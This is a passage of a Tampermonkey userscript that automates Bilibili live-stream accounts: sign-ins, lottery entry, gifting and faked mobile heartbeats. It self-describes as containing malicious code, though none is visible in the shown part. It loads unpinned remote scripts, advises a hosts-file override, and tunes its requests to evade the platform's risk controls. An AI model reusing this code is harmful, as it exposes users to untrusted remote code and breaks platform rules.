// ==UserScript==
// @name         Bilibili直播间挂机助手-魔改
// @namespace    SeaLoong
// @version      2.4.5.15
// @description  Bilibili直播间自动签到，领瓜子，参加抽奖，完成任务，送礼，自动点亮勋章，挂小心心等，包含恶意代码
// @author       SeaLoong,lzghzr,pjy612
// @updateURL    https://raw.githubusercontent.com/pjy612/Bilibili-LRHH/master/Bilibili%E7%9B%B4%E6%92%AD%E9%97%B4%E6%8C%82%E6%9C%BA%E5%8A%A9%E6%89%8B-%E9%AD%94%E6%94%B9.user.js
// @downloadURL  https://raw.githubusercontent.com/pjy612/Bilibili-LRHH/master/Bilibili%E7%9B%B4%E6%92%AD%E9%97%B4%E6%8C%82%E6%9C%BA%E5%8A%A9%E6%89%8B-%E9%AD%94%E6%94%B9.user.js
// @homepageURL  https://github.com/pjy612/Bilibili-LRHH
// @supportURL   https://github.com/pjy612/Bilibili-LRHH/issues
// @include      /https?:\/\/live\.bilibili\.com\/[blanc\/]?[^?]*?\d+\??.*/
// @include      /https?:\/\/api\.live\.bilibili\.com\/_.*/
// @require      https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js
// @require      https://raw.githubusercontent.com/pjy612/Bilibili-LRHH/master/BilibiliAPI_Plus.js
// @require      https://raw.githubusercontent.com/pjy612/Bilibili-LRHH/master/OCRAD.min.js
// @require      https://raw.githubusercontent.com/lzghzr/TampermonkeyJS/master/libBilibiliToken/libBilibiliToken.user.js
// @run-at       document-idle
// @license      MIT License
// @connect      passport.bilibili.com
// @connect      api.live.bilibili.com
// @grant        GM_xmlhttpRequest
// ==/UserScript==
/*
如果 raw.githubusercontent.com 无法访问 请自行尝试修改 Hosts 后 再尝试访问
151.101.76.133 raw.githubusercontent.com
*/
(function BLRHH_Plus() {
    'use strict';
    const NAME = 'BLRHH-Plus';
    const VERSION = '2.4.5.15';
    try {
	var tmpcache = JSON.parse(localStorage.getItem(`${NAME}_CACHE`));
	const t = Date.now() / 1000;
	if (t - tmpcache.unique_check >= 0 && t - tmpcache.unique_check <= 60) {
	    console.error('魔改脚本重复运行')
	    return;
	}
    } catch (e) {}
    let scriptRuning = false;
    let API;
    let TokenUtil;
    let Token;
    const window = typeof unsafeWindow === 'undefined' ? window : unsafeWindow;
    const isSubScript = () => window.frameElement && window.parent[NAME] && window.frameElement[NAME];

    const DEBUGMODE = false || window.top.localStorage.getItem('BLRHH-DEBUG');
    const DEBUG = (sign, ...data) => {
	if (!DEBUGMODE) return;
	let d = new Date();
	d =
	    `[${NAME}]${(isSubScript() ? 'SubScript:' : '')}[${d.getHours()}:${d.getMinutes()}:${d.getSeconds()}:${d.getMilliseconds()}]`;
	if (data.length === 1) console.debug(d, `${sign}:`, data[0]);
	else console.debug(d, `${sign}:`, data);
    };

    let CONFIG;
    let CACHE;
    let Info = {
	short_id: undefined,
	roomid: undefined,
	uid: undefined,
	ruid: undefined,
	rnd: undefined,
	csrf_token: undefined,
	visit_id: undefined,
	silver: undefined,
	gold: undefined,
	mobile_verify: undefined,
	identification: undefined,
	gift_list: undefined,
	gift_list_str: '礼物对照表',
	blocked: false,
	awardBlocked: false,
	appToken: undefined
    };
    const getAccessToken = async () => {
	if (Token && TokenUtil) {
	    const userToken = await Token.getToken();
	    if (userToken === undefined) {
		console.error('未获取到移动端token,部分功能可能失效');
	    }
	    return userToken;
	}
	return null;
    };

    const tz_offset = new Date().getTimezoneOffset() + 480;

    const ts_s = () => Math.round(ts_ms() / 1000);

    const ts_ms = () => Date.now();

    const getCookie = (name) => {
	let arr;
	const reg = new RegExp(`(^| )${name}=([^;]*)(;|$)`);
	if ((arr = document.cookie.match(reg))) {
	    return unescape(arr[2]);
	} else {
	    return null;
	}
    };

    const delayCall = (callback, delay = 10e3) => {
	const p = $.Deferred();
	setTimeout(() => {
	    const t = callback();
	    if (t && t.then) t.then((arg1, arg2, arg3, arg4, arg5, arg6) => p.resolve(arg1, arg2, arg3,
										      arg4, arg5, arg6));
	    else p.resolve();
	}, delay);
	return p;
    };

    const checkNewDay = (ts) => {
	// 检查是否为新的一天，以UTC+8为准
	const t = new Date(ts);
	t.setMinutes(t.getMinutes() + tz_offset);
	t.setHours(0, 0, 0, 0);
	const d = new Date();
	d.setMinutes(t.getMinutes() + tz_offset);
	return (d - t > 86400e3);
    };

    const runTomorrow = (callback,hours = 0) => {
	const t = new Date();
	t.setMinutes(t.getMinutes() + tz_offset);
	t.setDate(t.getDate() + 1);
	t.setHours(hours, 1, 0, 0);
	t.setMinutes(t.getMinutes() - tz_offset);
	setTimeout(callback, t - ts_ms());
	DEBUG('runTomorrow', t.toString());
    };
    if (!isSubScript()) {
	const runUntilSucceed = (callback, delay = 0, period = 100) => {
	    setTimeout(() => {
		if (!callback()) runUntilSucceed(callback, period, period);
	    }, delay);
	};

	const addCSS = (context) => {
	    const style = document.createElement('style');
	    style.type = 'text/css';
	    style.innerHTML = context;
	    document.getElementsByTagName('head')[0].appendChild(style);
	};

	const Essential = {
	    init: () => {
		return Essential.Toast.init().then(() => {
		    return Essential.AlertDialog.init().then(() => {
			return Essential.Config.init().then(() => {
			    Essential.DataSync.init();
			    Essential.Cache.load();
			    Essential.Config.load();
			});
		    });
		});
	    },
	    Toast: {
		init: () => {
		    try {
			const toastList = [];
			window.toast = (msg, type = 'info', timeout = 3e3) => {
			    let d = new Date().toLocaleTimeString();
			    switch (type) {
				case 'success':
				case 'info':
				    console.info(`[${NAME}][${d}]${msg}`);
				    break;
				case 'caution':
				    console.warn(`[${NAME}][${d}]${msg}`);
				    break;
				case 'error':
				    console.error(`[${NAME}][${d}]${msg}`);
				    break;
				default:
				    type = 'info';
				    console.log(`[${NAME}][${d}]${msg}`);
			    }
			    if (CONFIG && !CONFIG.SHOW_TOAST) return;
			    const a = $(
				`<div class="link-toast ${type} fixed"><span class="toast-text">${msg}</span></div>`
			    )[0];
			    document.body.appendChild(a);
			    a.style.top = (document.body.scrollTop + toastList.length * 40 + 10) + 'px';
			    a.style.left = (document.body.offsetWidth + document.body.scrollLeft - a.offsetWidth -
					    5) + 'px';
			    toastList.push(a);
			    setTimeout(() => {
				a.className += ' out';
				setTimeout(() => {
				    toastList.shift();
				    toastList.forEach((v) => {
					v.style.top = (parseInt(v.style.top, 10) -
						       40) + 'px';
				    });
				    $(a).remove();
				}, 200);
			    }, timeout);
			};
			return $.Deferred().resolve();
		    } catch (err) {
			console.error(`[${NAME}]初始化浮动提示时出现异常`);
			console.error(`[${NAME}]`, err);
			return $.Deferred().reject();
		    }
		}
	    }, // Need Init
	    AlertDialog: {
		init: () => {
		    try {
			const div_background = $(`<div id="${NAME}_alertdialog"/>`);
			div_background[0].style =
			    'display: table;position: fixed;height: 100%;width: 100%;top: 0;left: 0;font-size: 12px;z-index: 10000;background-color: rgba(0,0,0,.5);';
			const div_position = $('<div/>');
			div_position[0].style = 'display: table-cell;vertical-align: middle;';
			const div_style = $('<div/>');
			div_style[0].style =
			    'position: relative;top: 50%;width: 40%;padding: 16px;border-radius: 5px;background-color: #fff;margin: 0 auto;';
			div_position.append(div_style);
			div_background.append(div_position);

			const div_title = $('<div/>');
			div_title[0].style = 'position: relative;padding-bottom: 12px;';
			const div_title_span = $('<span>提示</span>');
			div_title_span[0].style = 'margin: 0;color: #23ade5;font-size: 16px;';
			div_title.append(div_title_span);
			div_style.append(div_title);

			const div_content = $('<div/>');
			div_content[0].style =
			    'display: inline-block;vertical-align: top;font-size: 14px;overflow: auto;height: 300px;';
			div_style.append(div_content);

			const div_button = $('<div/>');
			div_button[0].style = 'position: relative;height: 32px;margin-top: 12px;';
			div_style.append(div_button);

			const button_ok = $('<button><span>确定</span></button>');
			button_ok[0].style =
			    'position: absolute;height: 100%;min-width: 68px;right: 0;background-color: #23ade5;color: #fff;border-radius: 4px;font-size: 14px;border: 0;cursor: pointer;';
			div_button.append(button_ok);

			window.alertdialog = (title, content) => {
			    div_title_span.html(title);
			    div_content.html(content);
			    button_ok.click(() => {
				$(`#${NAME}_alertdialog`).remove();
			    });
			    $('body > .link-popup-ctnr').first().append(div_background);
			};
			return $.Deferred().resolve();
		    } catch (err) {
			window.toast('初始化帮助界面时出现异常', 'error');
			console.error(`[${NAME}]`, err);
			return $.Deferred().reject();
		    }
		}
	    }, // Need Init After Toast.init
	    Config: {
		CONFIG_DEFAULT: {
		    DD_BP: true,
		    DD_DM_STORM: true,
		    AUTO_SIGN: true,
		    AUTO_TREASUREBOX: true,
		    AUTO_GROUP_SIGN: true,
		    MOBILE_HEARTBEAT: true,
		    AUTO_LOTTERY: true,
		    AUTO_LOTTERY_CONFIG: {
			SLEEP_RANGE: "",
			GIFT_LOTTERY: true,
			GIFT_LOTTERY_CONFIG: {
			    REFRESH_INTERVAL: 0
			},
			GUARD_AWARD: true,
			GUARD_AWARD_CONFIG: {
			    LISTEN_NUMBER: 1,
			    CHANGE_ROOM_INTERVAL: 60
			},
			PK_AWARD: true,
			MATERIAL_OBJECT_LOTTERY: true,
			MATERIAL_OBJECT_LOTTERY_CONFIG: {
			    CHECK_INTERVAL: 10,
			    IGNORE_QUESTIONABLE_LOTTERY: true
			},
			STORM: false,
			STORM_CONFIG: {
			    STORM_QUEUE_SIZE: 3,
			    STORM_MAX_COUNT: 100,
			    STORM_ONE_LIMIT: 180,
			},
			HIDE_POPUP: true
		    },
		    AUTO_TASK: true,
		    AUTO_GIFT: false,
		    AUTO_GIFT_CONFIG: {
			ROOMID: [0],
			EXCLUDE_ROOMID: [0],
			GIFT_INTERVAL: 10,
			GIFT_LIMIT: 86400,
			GIFT_SORT: true,
			AUTO_LIGHT: true,
			SEND_ALL: false
		    },
		    SILVER2COIN: false,
		    AUTO_DAILYREWARD: true,
		    AUTO_DAILYREWARD_CONFIG: {
			LOGIN: true,
			WATCH: true,
			COIN: false,
			COIN_CONFIG: {
			    NUMBER: 5
			},
			SHARE: true
		    },
		    SHOW_TOAST: true
		},
		NAME: {
		    DD_BP: 'BiliPush推送',
		    DD_DM_STORM: 'DD弹幕风暴',
		    AUTO_SIGN: '自动签到',
		    AUTO_TREASUREBOX: '自动领取银瓜子',
		    AUTO_GROUP_SIGN: '自动应援团签到',
		    MOBILE_HEARTBEAT: '移动端心跳',
		    AUTO_LOTTERY: '自动抽奖',
		    AUTO_LOTTERY_CONFIG: {
			SLEEP_RANGE: '休眠时间',
			GIFT_LOTTERY: '礼物抽奖',
			GIFT_LOTTERY_CONFIG: {
			    REFRESH_INTERVAL: '刷新间隔'
			},
			GUARD_AWARD: '舰队领奖',
			GUARD_AWARD_CONFIG: {
			    LISTEN_NUMBER: '监听倍数',
			    CHANGE_ROOM_INTERVAL: '换房间隔'
			},
			PK_AWARD: '乱斗领奖',
			MATERIAL_OBJECT_LOTTERY: '实物抽奖',
			MATERIAL_OBJECT_LOTTERY_CONFIG: {
			    CHECK_INTERVAL: '检查间隔',
			    IGNORE_QUESTIONABLE_LOTTERY: '忽略存疑的抽奖'
			},
			STORM: '节奏风暴',
			STORM_CONFIG: {
			    STORM_QUEUE_SIZE: '同时参与数',
			    STORM_MAX_COUNT: '最大次数',
			    STORM_ONE_LIMIT: '尝试间隔',
			},
			HIDE_POPUP: '隐藏抽奖提示框'
		    },
		    AUTO_TASK: '自动完成任务',
		    AUTO_GIFT: '自动送礼物',
		    AUTO_GIFT_CONFIG: {
			ROOMID: '优先房间号',
			EXCLUDE_ROOMID: '排除房间号',
			GIFT_INTERVAL: '检查间隔(分钟)',
			GIFT_SORT: '优先高等级',
			GIFT_LIMIT: '到期时间(秒)',
			AUTO_LIGHT: '自动点亮勋章',
			SEND_ALL: '送满全部勋章'
		    },
		    SILVER2COIN: '银瓜子换硬币',
		    AUTO_DAILYREWARD: '自动每日奖励',
		    AUTO_DAILYREWARD_CONFIG: {
			LOGIN: '登录',
			WATCH: '观看',
			COIN: '投币',
			COIN_CONFIG: {
			    NUMBER: '数量'
			},
			SHARE: '分享'
		    },
		    SHOW_TOAST: '显示浮动提示'
		},
		PLACEHOLDER: {
		    AUTO_LOTTERY_CONFIG: {
			SLEEP_RANGE: '时间范围03:00-08:00',
			GIFT_LOTTERY_CONFIG: {
			    REFRESH_INTERVAL: '单位(分钟)'
			},
			GUARD_AWARD_CONFIG: {
			    LISTEN_NUMBER: '1~5，默认1',
			    CHANGE_ROOM_INTERVAL: '单位(分钟)'
			},
			MATERIAL_OBJECT_LOTTERY_CONFIG: {
			    CHECK_INTERVAL: '单位(分钟)'
			},
			STORM_CONFIG: {
			    STORM_QUEUE_SIZE: '',
			    STORM_MAX_COUNT: '',
			    STORM_ONE_LIMIT: '单位（毫秒）',
			},
		    },
		    AUTO_GIFT_CONFIG: {
			ROOMID: '为0不送礼',
			GIFT_DEFAULT: '为空默认不送',
			GIFT_ALLOWED: '为空允许所有'
		    }
		},
		HELP: {
		    DD_BP: '魔改助手核心监控，启用后由服务器推送全区礼物/舰队/PK（但需要验证使用者身份并带有DD传送门等附加功能）',
		    DD_DM_STORM: 'DD弹幕风暴（娱乐功能），配合DD传送门进行人力节奏风暴，用于活跃直播间气氛。',
		    MOBILE_HEARTBEAT: '发送移动端心跳数据包，可以完成双端观看任务',
		    AUTO_LOTTERY: '设置是否自动参加抽奖功能，包括礼物抽奖、活动抽奖、实物抽奖<br>会占用更多资源并可能导致卡顿，且有封号风险',
		    AUTO_LOTTERY_CONFIG: {
			SLEEP_RANGE: '休眠时间范围，英文逗号分隔<br>例如：<br>3:00-8:00,16:50-17:30<br>表示 3:00-8:00和16:50-17:30不进行礼物检测。<br>小时为当天只能为0-23,如果要转钟请单独配置aa:aa-23:59,00:00-bb:bb',
			GIFT_LOTTERY: '包括小电视、摩天大楼、C位光环及其他可以通过送礼触发广播的抽奖<br>内置几秒钟的延迟',
			GIFT_LOTTERY_CONFIG: {
			    REFRESH_INTERVAL: '设置页面自动刷新的时间间隔，设置为0则不启用，单位为分钟<br>太久导致页面崩溃将无法正常运行脚本'
			},
			GUARD_AWARD_CONFIG: {
			    LISTEN_NUMBER: '设置在各大分区中的每一个分区监听的直播间的数量，1~5之间的一个整数<br>可能导致占用大量内存或导致卡顿',
			    CHANGE_ROOM_INTERVAL: '设置在多久之后改变监听的房间，单位为分钟，0表示不改变'
			},
			MATERIAL_OBJECT_LOTTERY: '部分房间设有实物奖励抽奖，脚本使用穷举的方式检查是否有实物抽奖<br>请注意中奖后记得及时填写相关信息领取实物奖励',
			MATERIAL_OBJECT_LOTTERY_CONFIG: {
			    CHECK_INTERVAL: '每次穷举实物抽奖活动ID的时间间隔，单位为分钟',
			    IGNORE_QUESTIONABLE_LOTTERY: '对部分实物抽奖的标题存在疑问，勾选后不参加这部分抽奖'
			},
			STORM: '尝试参与节奏风暴<br>如果出现验证码提示的话请尝试实名制后再试',
			STORM_CONFIG: {
			    STORM_QUEUE_SIZE: '允许同时参与的风暴次数<br>超过容量时自动丢弃最早参与的风暴，避免同时请求过多造成风控',
			    STORM_MAX_COUNT: '单个风暴最大尝试次数',
			    STORM_ONE_LIMIT: '单个风暴参与次数间隔（毫秒）',
			},
			HIDE_POPUP: '隐藏位于聊天框下方的抽奖提示框<br>注意：脚本参加抽奖后，部分抽奖仍然可以手动点击参加，为避免小黑屋，不建议点击'
		    },
		    AUTO_GIFT_CONFIG: {
			ROOMID: '数组,优先送礼物的直播间ID(即地址中live.bilibili.com/后面的数字), 设置为0则无优先房间，小于0也视为0（因为你没有0的勋章）<br>例如：17171,21438956<br>不管[优先高等级]如何设置，会根据[送满全部勋章]（补满或者只消耗当日到期）条件去优先送17171的，再送21438956<br>之后根据[优先高等级]决定送高级还是低级',
			EXCLUDE_ROOMID: '数组,排除送礼的直播间ID(即地址中live.bilibili.com/后面的数字)，填写的直播间不会自动送礼',
			GIFT_INTERVAL: '检查间隔(分钟)',
			GIFT_SORT: '打钩优先赠送高等级勋章，不打勾优先赠送低等级勋章',
			GIFT_LIMIT: '到期时间范围（秒），86400为1天，时间小于1天的会被送掉',
			GIFT_DEFAULT: () => (`设置默认送的礼物类型编号，多个请用英文逗号(,)隔开，为空则表示默认不送出礼物<br>${Info.gift_list_str}`),
			GIFT_ALLOWED: () => (
			    `设置允许送的礼物类型编号(任何未在此列表的礼物一定不会被送出!)，多个请用英文逗号(,)隔开，为空则表示允许送出所有类型的礼物<br><br>${Info.gift_list_str}`
			),
			SEND_ALL: '打钩 送满全部勋章，否则 送出包裹中今天到期的礼物(会送出"默认礼物类型"之外的礼物，若今日亲密度已满则不送)',
			AUTO_LIGHT: '自动用小心心点亮亲密度未满且未被排除的灰掉的勋章'
		    },
		    SILVER2COIN: '用银瓜子兑换硬币，每天只能兑换一次<br>700银瓜子兑换1个硬币',
		    AUTO_DAILYREWARD: '自动完成每日经验的任务',
		    AUTO_DAILYREWARD_CONFIG: {
			LOGIN: '自动完成登录任务(凌晨的时候不一定能完成)',
			WATCH: '自动完成观看任务(凌晨的时候不一定能完成)',
			COIN: '对你关注的动态中最新几期的视频投币，直到投完设定的数量',
			SHARE: '自动分享你关注的动态中最新一期的视频(可以完成任务，但实际上不会出现这条动态)'
		    },
		    SHOW_TOAST: '选择是否显示浮动提示，但提示信息依旧会在控制台显示'
		},
		showed: false,
		init: () => {
		    try {
			const p = $.Deferred();
			const getConst = (itemname, obj) => {
			    if (itemname.indexOf('-') > -1) {
				const objname = itemname.match(/(.+?)-/)[1];
				if (objname && obj[objname]) return getConst(itemname.replace(
				    `${objname}-`, ''), obj[objname]);
				else return undefined;
			    }
			    if (typeof obj[itemname] === 'function') return obj[itemname]();
			    return obj[itemname];
			};
			const recur = (cfg, element, parentname = undefined) => {
			    for (const item in cfg) {
				let itemname;
				if (parentname) itemname = `${parentname}-${item}`;
				else itemname = item;
				const id = `${NAME}_config_${itemname}`;
				const name = getConst(itemname, Essential.Config.NAME);
				const placeholder = getConst(itemname, Essential.Config.PLACEHOLDER);
				let e;
				let h;
				if (getConst(itemname, Essential.Config.HELP)) h = $(
				    `<div class="${NAME}_help" id="${id}_help" style="display: inline;"><span class="${NAME}_clickable">?</span></div>`
				);
				switch ($.type(cfg[item])) {
				    case 'number':
				    case 'string':
					e = $(`<div class="${NAME}_setting_item"></div>`);
					e.html(
					    `<label style="display: inline;" title="${name}">${name}<input id="${id}" type="text" class="${NAME}_input_text" placeholder="${placeholder}"></label>`
					);
					if (h) e.append(h);
					element.append(e);
					break;
				    case 'boolean':
					e = $(`<div class="${NAME}_setting_item"></div>`);
					e.html(
					    `<label style="display: inline;" title="${name}"><input id="${id}" type="checkbox" class="${NAME}_input_checkbox">${name}</label>`
					);
					if (h) e.append(h);
					element.append(e);
					if (getConst(`${itemname}_CONFIG`, Essential.Config.NAME)) $(
					    `#${id}`).addClass(`${NAME}_control`);
					break;
				    case 'array':
					e = $(`<div class="${NAME}_setting_item"></div>`);
					e.html(
					    `<label style="display: inline;" title="${name}">${name}<input id="${id}" type="text" class="${NAME}_input_text" placeholder="${placeholder}"></label>`
					);
					if (h) e.append(h);
					element.append(e);
					break;
				    case 'object':
					e = $(`<div id="${id}" style="margin: 0px 0px 8px 12px;"/>`);
					element.append(e);
					recur(cfg[item], e, itemname);
					break;
				}
			    }
			};
			runUntilSucceed(() => {
			    try {
				let findSp = false;
				let blancFrames = $('iframe');
				if (blancFrames && blancFrames.length > 0) {
				    blancFrames.each((k, v) => {
					if (v.src.includes('/blanc/')) {
					    findSp = true;
					    window.toast('检查到特殊活动页，尝试跳转...', 'info', 5e3);
					    setTimeout(() => {
						location.replace(v.src);
					    }, 10);
					    return false;
					}
				    });
				}
				if (findSp) {
				    p.reject();
				    return true;
				}
				//if (!$('#sidebar-vm div.side-bar-cntr')[0]) return false;
				if (!$('#sidebar-vm')[0]) return false;
				// 加载css
				addCSS(
				    `.${NAME}_clickable {font-size: 12px;color: #0080c6;cursor: pointer;text-decoration: underline;}
.${NAME}_setting_item {margin: 6px 0px;}
.${NAME}_input_checkbox {vertical-align: bottom;}
.${NAME}_input_text {margin: -2px 0 -2px 4px;padding: 0;}`
				);
				// 绘制右下角按钮
				const div_button_span = $('<span>魔改助手设置</span>');
				div_button_span[0].style =
				    'font-size: 12px;line-height: 16px;color: #0080c6;';
				const div_button = $('<div/>');
				div_button[0].style =
				    'cursor: pointer;text-align: center;padding: 0px;';
				const div_side_bar = $('<div/>');
				div_side_bar[0].style =
				    'width: 56px;height: 32px;overflow: hidden;position: fixed;right: 0px;bottom: 10%;padding: 4px 4px;background-color: rgb(255, 255, 255);z-index: 10001;border-radius: 8px 0px 0px 8px;box-shadow: rgba(0, 85, 255, 0.0980392) 0px 0px 20px 0px;border: 1px solid rgb(233, 234, 236);';
				div_button.append(div_button_span);
				div_side_bar.append(div_button);
				//$('#sidebar-vm div.side-bar-cntr').first().after(div_side_bar);
				$('#sidebar-vm').after(div_side_bar);
				// 绘制设置界面
				const div_position = $('<div/>');
				div_position[0].style =
				    'display: none;position: fixed;height: 300px;width: 350px;bottom: 5%;z-index: 9999;';
				const div_style = $('<div/>');
				div_style[0].style =
				    'display: block;overflow: hidden;height: 300px;width: 350px;border-radius: 8px;box-shadow: rgba(106, 115, 133, 0.219608) 0px 6px 12px 0px;border: 1px solid rgb(233, 234, 236);background-color: rgb(255, 255, 255);';
				div_position.append(div_style);
				document.body.appendChild(div_position[0]);
				// 绘制标题栏及按钮
				const div_title = $('<div/>');
				div_title[0].style =
				    'display: block;border-bottom: 1px solid #E6E6E6;height: 35px;line-height: 35px;margin: 0;padding: 0;overflow: hidden;';
				const div_title_span = $(
				    '<span style="float: left;display: inline;padding-left: 8px;font: 700 14px/35px SimSun;">Bilibili直播间挂机助手-魔改</span>'
				);
				const div_title_button = $('<div/>');
				div_title_button[0].style =
				    'float: right;display: inline;padding-right: 8px;';
				const div_button_line = $(`<div style="display: inline;"></div>`);
				const span_button_state = $(
				    `<span class="${NAME}_clickable">统计</span>`)
				div_button_line.append(span_button_state);
				div_button_line.append("  ");
				const span_button_clear = $(
				    `<span class="${NAME}_clickable">清除缓存</span>`)
				div_button_line.append(span_button_clear);
				div_title_button.append(div_button_line);
				div_title.append(div_title_span);
				div_title.append(div_title_button);
				div_style.append(div_title);
				// 绘制设置项内容
				const div_context_position = $('<div/>');
				div_context_position[0].style =
				    'display: block;position: absolute;top: 36px;width: 100%;height: calc(100% - 36px);';
				const div_context = $('<div/>');
				div_context[0].style =
				    'height: 100%;overflow: auto;padding: 0 12px;margin: 0px;';
				div_context_position.append(div_context);
				div_style.append(div_context_position);
				recur(Essential.Config.CONFIG_DEFAULT, div_context);
				// 设置事件
				div_button.click(() => {
				    if (!Essential.Config.showed) {
					Essential.Config.load();
					div_position.css('right', div_side_bar[0].clientWidth +
							 'px');
					div_position.show();
					div_button_span.text('点击保存设置');
					div_button_span.css('color', '#ff8e29');
				    } else {
					Essential.Config.save();
					div_position.hide();
					div_button_span.text('魔改助手设置');
					div_button_span.css('color', '#0080c6');
					BiliPushUtils.Check.sleepTimeRangeBuild();
					if (CONFIG.DD_BP) {
					    BiliPush.connectWebsocket(true);
					} else if (BiliPush.gsocket) {
					    BiliPush.gsocket.close();
					}
				    }
				    Essential.Config.showed = !Essential.Config.showed;
				});
				span_button_clear.click(() => {
				    Essential.Cache.clear();
				    location.reload();
				});
				span_button_state.click(() => {
				    Statistics.showDayGifts();
				});
				const getItemByElement = (element) => element.id.replace(
				    `${NAME}_config_`, '');
				const getItemByHelpElement = (element) => element.id.replace(
				    `${NAME}_config_`, '').replace('_help', '');
				$(`.${NAME}_help`).click(function () {
				    window.alertdialog('说明', getConst(getItemByHelpElement(
					this), Essential.Config.HELP));
				});
				$(`.${NAME}_control`).click(function () {
				    if ($(this).is(':checked')) {
					$(
					    `#${NAME}_config_${getItemByElement(this)}_CONFIG`
					).show();
				    } else {
					$(
					    `#${NAME}_config_${getItemByElement(this)}_CONFIG`
					).hide();
				    }
				});
				p.resolve();
				return true;
			    } catch (err) {
				window.toast('初始化设置界面时出现异常', 'error');
				console.error(`[${NAME}]`, err);
				p.reject();
				return true;
			    }
			});
			return p;
		    } catch (err) {
			window.toast('初始化设置时出现异常', 'error');
			console.error(`[${NAME}]`, err);
			return $.Deferred().reject();
		    }
		},
		recurLoad: (cfg, parentname = undefined, cfg_default = Essential.Config.CONFIG_DEFAULT) => {
		    for (const item in cfg_default) {
			let itemname;
			if (parentname) itemname = `${parentname}-${item}`;
			else itemname = item;
			const e = $(`#${NAME}_config_${itemname}`);
			if (!e[0]) continue;
			if (cfg[item] === undefined) cfg[item] = Essential.Config._copy(cfg_default[item]);
			switch ($.type(cfg[item])) {
			    case 'number':
			    case 'string':
				e.val(cfg[item]);
				break;
			    case 'boolean':
				e.prop('checked', cfg[item]);
				if (e.is(':checked')) $(`#${NAME}_config_${itemname}_CONFIG`).show();
				else $(`#${NAME}_config_${itemname}_CONFIG`).hide();
				break;
			    case 'array':
				e.val(cfg[item].join(','));
				break;
			    case 'object':
				Essential.Config.recurLoad(cfg[item], itemname, cfg_default[item]);
				break;
			}
		    }
		},
		recurSave: (cfg, parentname = undefined, cfg_default = Essential.Config.CONFIG_DEFAULT) => {
		    if (Object.prototype.toString.call(cfg) !== '[object Object]') return cfg;
		    for (const item in cfg_default) {
			let itemname;
			if (parentname) itemname = `${parentname}-${item}`;
			else itemname = item;
			const e = $(`#${NAME}_config_${itemname}`);
			if (!e[0]) continue;
			switch ($.type(cfg[item])) {
			    case 'string':
				cfg[item] = e.val() || '';
				break;
			    case 'number':
				cfg[item] = parseFloat(e.val());
				if (isNaN(cfg[item])) cfg[item] = 0;
				break;
			    case 'boolean':
				cfg[item] = e.is(':checked');
				break;
			    case 'array':
				var value = e.val().replace(/(\s|\u00A0)+/, '');
				if (value === '') {
				    cfg[item] = [];
				} else {
				    cfg[item] = value.split(',');
				    cfg[item].forEach((v, i) => {
					cfg[item][i] = parseFloat(v);
					if (isNaN(cfg[item][i])) cfg[item][i] = 0;
				    });
				}
				break;
			    case 'object':
				cfg[item] = Essential.Config.recurSave(cfg[item], itemname, cfg_default[
				    item]);
				break;
			}
			if (cfg[item] === undefined) cfg[item] = Essential.Config._copy(cfg_default[item]);
		    }
		    return cfg;
		},
		fix: (config) => {
		    // 修正设置项中不合法的参数，针对有输入框的设置项
		    if (config.AUTO_LOTTERY_CONFIG.GUARD_AWARD_CONFIG.LISTEN_NUMBER === undefined) config.AUTO_LOTTERY_CONFIG
			.GUARD_AWARD_CONFIG.LISTEN_NUMBER = Essential.Config.CONFIG_DEFAULT.AUTO_LOTTERY_CONFIG
			.GUARD_AWARD_CONFIG.LISTEN_NUMBER;
		    config.AUTO_LOTTERY_CONFIG.GUARD_AWARD_CONFIG.LISTEN_NUMBER = parseInt(config.AUTO_LOTTERY_CONFIG
											   .GUARD_AWARD_CONFIG.LISTEN_NUMBER, 10);
		    if (config.AUTO_LOTTERY_CONFIG.GUARD_AWARD_CONFIG.LISTEN_NUMBER < 1) config.AUTO_LOTTERY_CONFIG
			.GUARD_AWARD_CONFIG.LISTEN_NUMBER = 1;
		    else if (config.AUTO_LOTTERY_CONFIG.GUARD_AWARD_CONFIG.LISTEN_NUMBER > 5) config.AUTO_LOTTERY_CONFIG
			.GUARD_AWARD_CONFIG.LISTEN_NUMBER = 5;

		    if (config.AUTO_LOTTERY_CONFIG.GIFT_LOTTERY_CONFIG.REFRESH_INTERVAL === undefined)
			config.AUTO_LOTTERY_CONFIG.GIFT_LOTTERY_CONFIG.REFRESH_INTERVAL = Essential.Config.CONFIG_DEFAULT
			    .AUTO_LOTTERY_CONFIG.GIFT_LOTTERY_CONFIG.REFRESH_INTERVAL;
		    config.AUTO_LOTTERY_CONFIG.GIFT_LOTTERY_CONFIG.REFRESH_INTERVAL = parseInt(config.AUTO_LOTTERY_CONFIG
											       .GIFT_LOTTERY_CONFIG.REFRESH_INTERVAL, 10);
		    if (config.AUTO_LOTTERY_CONFIG.GIFT_LOTTERY_CONFIG.REFRESH_INTERVAL < 0) config.AUTO_LOTTERY_CONFIG
			.GIFT_LOTTERY_CONFIG.REFRESH_INTERVAL = 0;

		    if (config.AUTO_LOTTERY_CONFIG.GUARD_AWARD_CONFIG.CHANGE_ROOM_INTERVAL === undefined)
			config.AUTO_LOTTERY_CONFIG.GUARD_AWARD_CONFIG.CHANGE_ROOM_INTERVAL = Essential.Config
			    .CONFIG_DEFAULT.AUTO_LOTTERY_CONFIG.GUARD_AWARD_CONFIG.CHANGE_ROOM_INTERVAL;
		    config.AUTO_LOTTERY_CONFIG.GUARD_AWARD_CONFIG.CHANGE_ROOM_INTERVAL = parseInt(config.AUTO_LOTTERY_CONFIG
												  .GUARD_AWARD_CONFIG.CHANGE_ROOM_INTERVAL, 10);
		    if (config.AUTO_LOTTERY_CONFIG.GUARD_AWARD_CONFIG.CHANGE_ROOM_INTERVAL < 0) config.AUTO_LOTTERY_CONFIG
			.GUARD_AWARD_CONFIG.CHANGE_ROOM_INTERVAL = 0;

		    if (config.AUTO_LOTTERY_CONFIG.MATERIAL_OBJECT_LOTTERY_CONFIG.CHECK_INTERVAL ===
			undefined) config.AUTO_LOTTERY_CONFIG.MATERIAL_OBJECT_LOTTERY_CONFIG.CHECK_INTERVAL =
			Essential.Config.CONFIG_DEFAULT.AUTO_LOTTERY_CONFIG.MATERIAL_OBJECT_LOTTERY_CONFIG.CHECK_INTERVAL;
		    config.AUTO_LOTTERY_CONFIG.MATERIAL_OBJECT_LOTTERY_CONFIG.CHECK_INTERVAL = parseInt(
			config.AUTO_LOTTERY_CONFIG.MATERIAL_OBJECT_LOTTERY_CONFIG.CHECK_INTERVAL, 10);
		    if (config.AUTO_LOTTERY_CONFIG.MATERIAL_OBJECT_LOTTERY_CONFIG.CHECK_INTERVAL < 0) config
